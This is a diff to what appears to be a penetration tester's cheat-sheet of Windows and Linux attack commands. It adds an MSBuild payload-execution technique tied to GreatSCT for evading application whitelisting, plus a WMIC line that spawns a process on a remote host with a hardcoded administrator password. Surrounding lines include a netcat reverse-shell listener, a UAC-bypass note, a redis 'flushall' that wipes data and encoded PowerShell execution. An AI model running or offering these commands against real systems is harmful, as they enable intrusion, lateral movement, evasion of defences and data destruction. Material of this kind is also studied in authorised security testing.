@@ -98,6 +98,9 @@ rlwrap nc.exe -lvnp 9001
 #bypassing UAC on windows 
 net use Z: \\127.0.0.1\c$
 GreatSCT (msbuild)
+c$\Windows\Microsoft.NET\Framework64\v4.0.30319
+c$\Windows\Microsoft.NET\Framework\v4.0.30319
+MSBuild.exe msbuild.xml
 
 # native windows base64 encode/decode
 certutil -encode infile outfile
@@ -137,3 +140,6 @@ redis-cli -s /var/run/redis/redis.sock flushall
 #encode a command to run as powershell argument
 echo "ping -n 1 10.10.10.10" | iconv -t utf8-16le | base64 -w 0
 powershell -encodedcommand XXXXXXXXXXXXXX
+
+#run cmd on remote computerName
+WMIC /user:administrator /password:Aa123456 /node:172.21.128.56 process call create "cmd.exe /c start.exe"
